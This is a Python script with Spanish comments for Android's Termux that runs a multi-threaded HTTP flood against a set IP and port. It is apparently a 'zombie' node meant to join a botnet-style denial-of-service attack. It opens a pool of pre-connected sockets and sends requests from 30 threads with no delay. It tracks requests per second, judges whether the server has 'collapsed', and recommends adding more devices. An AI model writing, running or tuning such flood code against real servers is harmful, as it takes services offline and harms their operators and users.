#!/data/data/com.termux/files/usr/bin/python3
"""
⚡ ZOMBIE ULTRA-OPTIMIZADO - POOL DE SOCKETS
"""

import socket
import threading
import time
import random

# CONFIGURACIÓN
TARGET_IP = "192.168.1.100"
TARGET_PORT = 8080
DURATION = 20

# POOL DE SOCKETS GLOBAL
SOCKET_POOL = []
SOCKET_LOCK = threading.Lock()
REQUEST_COUNT = 0
ERROR_COUNT = 0

def crear_socket_pool(tamaño=100):
    """Crear pool de sockets PRE-CONECTADOS"""
    print(f"🛠️ Creando pool de {tamaño} sockets...")
    
    for _ in range(tamaño):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)  # 100ms timeout
            s.connect((TARGET_IP, TARGET_PORT))
            
            with SOCKET_LOCK:
                SOCKET_POOL.append(s)
        except Exception as e:
            print(f"⚠️ Error creando socket: {e}")
    
    print(f"✅ Pool creado: {len(SOCKET_POOL)} sockets")

def atacante_optimizado(id_atacante, duracion):
    """Atacante que REUSA sockets del pool"""
    global REQUEST_COUNT, ERROR_COUNT
    
    tiempo_fin = time.time() + duracion
    contador_local = 0
    
    # REQUEST PRE-COMPILADO
    http_request = f"GET / HTTP/1.1\r\nHost: {TARGET_IP}\r\n\r\n".encode()
    
    while time.time() < tiempo_fin and ERROR_COUNT < 10000:
        socket_actual = None
        
        try:
            # 1. TOMAR SOCKET DEL POOL (o crear nuevo si no hay)
            with SOCKET_LOCK:
                if SOCKET_POOL:
                    socket_actual = SOCKET_POOL.pop()
                else:
                    # Crear socket nuevo si pool vacío
                    socket_actual = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    socket_actual.settimeout(0.05)
                    socket_actual.connect((TARGET_IP, TARGET_PORT))
            
            # 2. ENVIAR MÚLTIPLES REQUESTS POR LA MISMA CONEXIÓN
            for _ in range(50):  # 50 requests por conexión
                if time.time() > tiempo_fin:
                    break
                
                try:
                    socket_actual.send(http_request)
                    contador_local += 1
                    REQUEST_COUNT += 1
                    
                    # SIN SLEEP ENTRE REQUESTS
                    # time.sleep(0)  # ¡CERO!
                    
                except BrokenPipeError:
                    # Conexión rota, salir del loop
                    ERROR_COUNT += 1
                    break
                except:
                    ERROR_COUNT += 1
            
            # 3. DEVOLVER SOCKET AL POOL (NO CERRAR)
            if socket_actual:
                with SOCKET_LOCK:
                    SOCKET_POOL.append(socket_actual)
            
        except (ConnectionRefusedError, ConnectionResetError):
            ERROR_COUNT += 100
            print(f"🔥 ¡SERVIDOR SATURADO! Conexiones rechazadas")
            # Intentar recrear socket
            try:
                nuevo_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                nuevo_socket.settimeout(0.05)
                nuevo_socket.connect((TARGET_IP, TARGET_PORT))
                with SOCKET_LOCK:
                    SOCKET_POOL.append(nuevo_socket)
            except:
                pass
        except socket.timeout:
            ERROR_COUNT += 1
        except Exception as e:
            ERROR_COUNT += 1
            # Si el socket está roto, no devolver al pool
            continue
    
    if contador_local > 0:
        print(f"[Atacante {id_atacante}] {contador_local:,} requests")

def ataque_principal():
    """Función principal de ataque"""
    print(f"\n💀 ATAQUE ULTRA-OPTIMIZADO INICIADO")
    print(f"🎯 Objetivo: {TARGET_IP}:{TARGET_PORT}")
    print(f"⏱️ Duración: {DURATION}s")
    
    # Crear pool inicial
    crear_socket_pool(200)  # 200 sockets pre-conectados
    
    # INICIAR HILOS DE ATAQUE
    print(f"🚀 Lanzando 30 hilos optimizados...")
    hilos = []
    
    for i in range(30):
        hilo = threading.Thread(
            target=atacante_optimizado,
            args=(i+1, DURATION),
            daemon=True
        )
        hilos.append(hilo)
        hilo.start()
    
    # MONITOR EN TIEMPO REAL
    print(f"\n📊 MONITOR EN TIEMPO REAL")
    print("-" * 50)
    
    inicio = time.time()
    ultimo_contador = 0
    
    while time.time() < inicio + DURATION + 2:
        tiempo_transcurrido = time.time() - inicio
        
        if tiempo_transcurrido > 1:
            rps_actual = (REQUEST_COUNT - ultimo_contador) / 1.0
            ultimo_contador = REQUEST_COUNT
            
            print(f"[{int(tiempo_transcurrido)}s] "
                  f"Requests: {REQUEST_COUNT:,} | "
                  f"RPS: {rps_actual:.0f} | "
                  f"Pool: {len(SOCKET_POOL)} sockets | "
                  f"Errores: {ERROR_COUNT:,}")
        
        time.sleep(1)
    
    # ESPERAR HILOS
    for hilo in hilos:
        hilo.join(timeout=1)
    
    # RESULTADOS FINALES
    tiempo_total = time.time() - inicio
    rps_promedio = REQUEST_COUNT / tiempo_total if tiempo_total > 0 else 0
    
    print(f"\n✅ ATAQUE COMPLETADO")
    print(f"📈 Requests totales: {REQUEST_COUNT:,}")
    print(f"❌ Errores: {ERROR_COUNT:,}")
    print(f"⚡ RPS promedio: {rps_promedio:.0f}")
    print(f"🎯 Target: {TARGET_IP}:{TARGET_PORT}")
    print(f"🔌 Sockets en pool: {len(SOCKET_POOL)}")
    
    # LIMPIAR POOL
    print(f"🧹 Limpiando pool de sockets...")
    with SOCKET_LOCK:
        for sock in SOCKET_POOL:
            try:
                sock.close()
            except:
                pass
        SOCKET_POOL.clear()
    
    # EVALUACIÓN
    print(f"\n📋 EVALUACIÓN DE EFECTIVIDAD:")
    if rps_promedio > 5000:
        print("💀 ¡ATAQUE EXITOSO! Server debería estar colapsado")
    elif rps_promedio > 2000:
        print("🔥 Ataque fuerte. Server bajo estrés severo")
    elif rps_promedio > 1000:
        print("⚠️ Ataque moderado. Server bajo estrés")
    else:
        print("📉 Ataque débil. Limitaciones de dispositivo/red")
        print("   Recomendación: Usar múltiples dispositivos")

# Para ejecutar DIRECTAMENTE (sin maestro)
if __name__ == "__main__":
    print("⚡ ZOMBIE ULTRA-OPTIMIZADO - MODO AUTÓNOMO")
    print("=" * 60)
    
    try:
        ataque_principal()
    except KeyboardInterrupt:
        print(f"\n⏹️ Ataque interrumpido por usuario")
    except Exception as e:
        print(f"❌ Error: {e}")
    
    print("\n" + "=" * 60)
